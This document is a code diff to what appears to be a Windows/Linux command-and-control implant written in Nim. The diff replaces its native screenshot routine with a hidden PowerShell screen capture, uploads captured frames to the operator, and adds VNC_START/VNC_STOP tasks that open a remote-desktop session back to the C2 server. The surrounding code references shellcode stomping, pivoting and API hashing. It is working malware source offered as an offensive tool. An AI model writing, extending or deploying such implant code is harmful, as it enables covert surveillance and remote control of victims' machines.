@@ -10,6 +10,7 @@ when defined(windows):
   import rsocks, http_pivot, tcp_pivot, pipe_server
   import bof
   import api_hash
+  import vnc
 
 when not defined(windows):
   import std/net
@@ -292,67 +293,28 @@ when defined(windows):
     if n == 0: return default
     return $buf
 
-  # ── Screenshot (native GDI) ──────────────────────────────────────────────────
+  # ── Screenshot via PowerShell CopyFromScreen ─────────────────────────────────
+  # Avoids GDI thread-affinity issues; works from any session context.
   proc doScreenshotWin(): (seq[byte], bool) =
-    let hDC = GetDC(0)
-    if hDC == 0: return (@[], false)
-    defer: discard ReleaseDC(0, hDC)
-    let w = GetSystemMetrics(SM_CXSCREEN)
-    let h = GetSystemMetrics(SM_CYSCREEN)
-    if w <= 0 or h <= 0: return (@[], true)
-    let hMem = CreateCompatibleDC(hDC)
-    if hMem == 0: return (@[], false)
-    defer: discard DeleteDC(hMem)
-    let hBmp = CreateCompatibleBitmap(hDC, w, h)
-    if hBmp == 0: return (@[], false)
-    defer: discard DeleteObject(hBmp)
-    let hOld = SelectObject(hMem, hBmp)
-    defer: discard SelectObject(hMem, hOld)
-    discard BitBlt(hMem, 0, 0, w, h, hDC, 0, 0, SRCCOPY)
-    var bi: BITMAPINFOHEADER
-    bi.biSize = DWORD(sizeof(bi))
-    bi.biWidth = w; bi.biHeight = -h
-    bi.biPlanes = 1; bi.biBitCount = 32
-    bi.biCompression = BI_RGB
-    let dataSz = w * h * 4
-    var pixels = newSeq[uint8](dataSz)
-    if GetDIBits(hMem, hBmp, 0, UINT(h), addr pixels[0],
-                 cast[ptr BITMAPINFO](addr bi), DIB_RGB_COLORS) == 0:
+    let ps =
+      "Add-Type -AssemblyName System.Drawing,System.Windows.Forms;" &
+      "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" &
+      "$bmp=[System.Drawing.Bitmap]::new($s.Width,$s.Height);" &
+      "$gfx=[System.Drawing.Graphics]::FromImage($bmp);" &
+      "$gfx.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);" &
+      "$ms=[System.IO.MemoryStream]::new();" &
+      "$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png);" &
+      "[Convert]::ToBase64String($ms.ToArray())"
+    let cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"" & ps & "\""
+    let (outp, rc) = execCmdEx(cmd)
+    if rc != 0 or outp.len == 0: return (@[], false)
+    let b64 = outp.strip()
+    try:
+      let data = cast[seq[byte]](base64.decode(b64))
+      if data.len == 0: return (@[], false)
+      return (data, false)
+    except:
       return (@[], false)
-    var allBlack = true
-    for px in pixels:
-      if px != 0: allBlack = false; break
-    if allBlack: return (@[], true)
-    let rowBytes = ((w * 32 + 31) div 32) * 4
-    let fileSize = 54 + rowBytes * h
-    var bmpFile = newSeq[byte](fileSize)
-    template w32(off: int, v: uint32) =
-      bmpFile[off]   = uint8(v and 0xFF)
-      bmpFile[off+1] = uint8((v shr 8) and 0xFF)
-      bmpFile[off+2] = uint8((v shr 16) and 0xFF)
-      bmpFile[off+3] = uint8((v shr 24) and 0xFF)
-    template w16(off: int, v: uint16) =
-      bmpFile[off]   = uint8(v and 0xFF)
-      bmpFile[off+1] = uint8((v shr 8) and 0xFF)
-    bmpFile[0] = 0x42; bmpFile[1] = 0x4D
-    w32(2,  uint32(fileSize))
-    w32(10, 54u32)
-    w32(14, 40u32)
-    w32(18, uint32(w)); w32(22, uint32(h))
-    w16(26, 1u16); w16(28, 32u16)
-    w32(30, BI_RGB)
-    w32(34, uint32(rowBytes * h))
-    for row in 0 ..< h:
-      let srcRow = (h - 1 - row) * w * 4
-      let dstRow = 54 + row * rowBytes
-      for col in 0 ..< w:
-        let s = srcRow + col * 4
-        let d = dstRow + col * 4
-        bmpFile[d]   = pixels[s+2]
-        bmpFile[d+1] = pixels[s+1]
-        bmpFile[d+2] = pixels[s]
-        bmpFile[d+3] = pixels[s+3]
-    return (bmpFile, false)
 
   # ── SHELLCODE_STOMP ──────────────────────────────────────────────────────────
   proc doShellcodeStompInner(sc: seq[byte]; dllHint: string): string =
@@ -2236,7 +2198,7 @@ proc screenwatchTick*(t: var AgentTransport) =
   if noDesktop:
     t.sendResult(gSwTaskId, "", "screenshot: no_interactive_desktop")
   elif data.len > 0:
-    let nm = "watch_" & $gSwFrame & (when defined(windows): ".bmp" else: ".png")
+    let nm = "watch_" & $gSwFrame & ".png"
     inc gSwFrame
     discard t.uploadFile(gSwTaskId, nm, data)
     t.sendResult(gSwTaskId, "[+] screenwatch frame captured", "")
@@ -2461,7 +2423,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     elif data.len == 0:
       t.sendResult(id, "", "screenshot failed")
     else:
-      let ext = when defined(windows): ".bmp" else: ".png"
+      let ext = ".png"
       discard t.uploadFile(id, "screenshot" & ext, data)
       t.sendResult(id, "[+] screenshot captured (" & $data.len & " bytes)", "")
 
@@ -3864,6 +3826,37 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       t.sendResult(id, pipeServerStop(args), "")
     else:
       t.sendResult(id, "", "PIPE_STOP: not supported on Linux")
+
+  of "VNC_START":
+    when defined(windows):
+      let parts = args.split(' ', maxsplit=4)
+      let port = if parts.len > 0 and parts[0].len > 0: parts[0].parseInt() else: 0
+      let quality = if parts.len > 1 and parts[1].len > 0: parts[1].parseInt() else: 60
+      if port <= 0:
+        t.sendResult(id, "", "VNC_START: missing port")
+      else:
+        # Extract host from ServerUrl
+        var c2Host = "127.0.0.1"
+        let u = ServerUrl
+        var start = u.find("://")
+        let hostPart = if start >= 0: u[start+3..^1] else: u
+        let colonPos = hostPart.find(':')
+        let slashPos = hostPart.find('/')
+        let endPos = if colonPos >= 0 and (slashPos < 0 or colonPos < slashPos): colonPos
+                     elif slashPos >= 0: slashPos
+                     else: hostPart.len
+        if endPos > 0: c2Host = hostPart[0..<endPos]
+        vncStart(c2Host, port, quality)
+        t.sendResult(id, "[+] VNC session started", "")
+    else:
+      t.sendResult(id, "", "VNC_START: not supported on Linux")
+
+  of "VNC_STOP":
+    when defined(windows):
+      vncStop()
+      t.sendResult(id, "[+] VNC session stopped", "")
+    else:
+      t.sendResult(id, "", "VNC_STOP: not supported on Linux")
 
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
